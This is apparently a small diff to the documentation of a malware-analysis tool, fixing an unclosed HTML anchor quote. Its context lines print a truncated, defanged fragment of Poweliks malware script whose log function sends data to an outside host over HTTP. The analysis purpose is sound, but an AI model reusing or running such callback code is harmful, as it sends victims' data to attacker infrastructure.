@@ -327,7 +327,7 @@ cat /tmp/script.vbe | head -c 120
 function log(l){try{x=new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","hxxp://faebd7[.]com/log?log="+l,false);x
 </pre>
 
-## Plugins: <a name="plugins-main></a>
+## Plugins: <a name="plugins-main"></a>
 <pre>
 -s "examples/poweliks.dat" -p "plugin_name < plugin_params >,plugin_name < plugin_params >"
 </pre>
